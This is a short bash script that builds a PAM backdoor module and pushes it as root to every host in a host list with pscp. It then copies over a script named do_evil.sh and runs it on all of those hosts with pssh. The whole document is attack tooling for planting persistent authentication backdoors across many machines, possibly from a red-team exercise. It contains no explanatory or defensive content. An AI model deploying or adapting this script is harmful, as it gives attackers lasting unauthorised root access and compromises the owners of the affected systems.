#!/bin/bash
# generate the PAM backdoor
cd pam && ./gen.sh && cd ..
# copy the extra pam module to the other hosts
pscp -h pssh_hostfile.txt -l root pam_extra.so /usr/lib64/security/pam_extra.so

# Copy over the evil script
pscp -h pssh_hostfile.txt -l root do_evil.sh /root/do_evil.sh

# run the evil script
pssh -h pssh_hostfile.txt -l root chmod +x /root/do_evil.sh
pssh -h pssh_hostfile.txt -l root /root/do_evil.sh

